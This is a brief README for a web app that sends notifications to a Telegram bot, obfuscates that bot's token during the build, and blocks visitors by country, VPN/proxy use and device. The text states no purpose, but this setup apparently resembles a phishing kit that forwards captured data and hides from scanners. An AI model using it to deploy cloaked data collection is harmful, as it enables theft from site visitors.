# React Application

## Quick Start

### 1. Configure Telegram Notifications

Edit `public/config/user-telegram-config.json`:

```json
{
  "telegram": {
    "bot_token": "YOUR_BOT_TOKEN_HERE",
    "chat_id": "YOUR_CHAT_ID_HERE",
    "enabled": true
  }
}
```

Replace:
- `YOUR_BOT_TOKEN_HERE` with your Telegram bot token
- `YOUR_CHAT_ID_HERE` with your Telegram chat ID

### 2. Configure Security Rules

Edit `agent/config/dk_rules.json` to set:
- Country restrictions
- VPN/proxy blocking
- Rate limiting
- Device restrictions

### 3. Build and Deploy

```bash
npm install
npm run build
```

The build process automatically:
- Obfuscates your Telegram config
- Creates production files in `dist/` folder

### 4. Deploy

- **Fresh Server Setup**: See `CLEAN_SERVER.md` for complete guide from server installation to deployment
- **Other**: Copy `dist/` folder contents to your web server

## Notes

- Telegram config is automatically obfuscated during build (no manual steps needed)
- Security rules are read from `agent/config/dk_rules.json`
- Built files are in `dist/` folder after running `npm run build`
